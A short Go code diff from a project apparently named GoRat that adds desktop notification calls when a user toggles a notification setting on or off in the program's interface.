@@ -6,6 +6,8 @@ import (
 	"strings"
 	"time"
 
+	"github.com/NotKatsu/GoRat/modules"
+
 	go_rat "github.com/AllenDang/giu"
 	"github.com/NotKatsu/GoRat/modules/database"
 	"github.com/pterm/pterm"
@@ -29,8 +31,10 @@ func notificationStateText() string {
 
 func updateNotifcationState() {
 	if currentNotificationState == true {
+		modules.NewNotification("GoRat - Notifications Toggled", "Notifications have been toggled off.")
 		currentNotificationState = false
 	} else {
+		modules.NewNotification("GoRat - Notifications Toggled", "Notifications have been toggled on.")
 		currentNotificationState = true
 	}
 }
